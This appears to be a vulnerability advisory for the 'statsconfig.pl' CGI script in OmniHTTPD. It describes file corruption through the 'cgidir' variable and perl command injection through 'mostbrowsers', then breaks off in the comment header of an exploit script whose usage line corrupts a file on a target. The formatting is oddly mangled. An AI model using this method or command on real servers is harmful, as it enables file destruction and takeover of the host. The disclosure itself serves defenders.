OmniHTTPD has various features including multiple domain support , keep-alive connections , supports virtual IP and non-IP servers and standard CGI support. ， Due to the implementation of 'statsconfig.pl' multiple vulnerabilities exist in OmniHTTPD. It is possible to corrupt various known filenames and execute arbitrary commands. By appending a known filename to the 'cgidir' form variable accompanied with a null argument , the known filename will be corrupt. In addition , it is possible to execute commands on the target server. This is due to statsconfig.pl creating a perl script on the file. When the perl script is created , user supplied data ( the mostbrowsers form variable if it is present ) is written directly to the perl script file. If an attacker sets this value to semi-colon separated perl commands , they will be executed when statsconfig runs the script. This can result in an attacker gaining interactive access on the victim host with the privilege level of the webserver/cgi process. ， Successful exploitation of this vulnerability could lead to complete comprimise of the host or denial of service. ，  #  ! /usr/bin/perl ，  #  #  ，  # omnismash v1.2 by Joe Testa [ 01.08.2001 9 : 26PM ]  #  ，  #  ( joetesta @ hushmail.com )  #  ，  #  #  ，  #  #  ，  # This program exploits two holes in #  ，  # 'statsconfig.pl' , a cgi script which is installed #  ，  # by default by OmniHTTPd v2.07 ( and possibly older #  ，  # versions ) . #  ，  #  #  ，  # 1. ) Any file on the system may be corrupted ,  #  ，  # including those on drives the server does not #  ，  # reside on. #  ，  #  #  ，  #  #  ，  # Example :  #  ，  #  #  ，  # perl omnismash.pl localhost 80 -corrupt #  ，  # c : \\autoexec.bak #  ，  #  #  ，  #  #  ，  # 2. ) Code can be injected into #  ，  # '/cgi-bin/stats.pl'.
